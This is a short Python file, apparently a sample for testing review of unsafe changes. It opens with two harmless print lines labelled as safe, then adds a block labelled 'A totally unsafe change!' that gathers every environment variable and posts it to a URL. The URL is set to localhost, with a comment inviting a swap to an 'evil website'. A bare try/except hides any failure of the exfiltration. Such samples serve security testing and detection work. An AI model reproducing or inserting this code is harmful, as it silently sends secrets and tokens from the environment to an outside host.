print("a totally safe file")

print("a safe change")

# A totally unsafe change!
try:
    from urllib.request import urlopen
    from urllib.parse import urlencode
    import os
    evil_url = "http://localhost:8080/post"  # replace with your preferred evil website
    urlopen(evil_url, data=urlencode(os.environ).encode('utf-8'))
except:
    pass
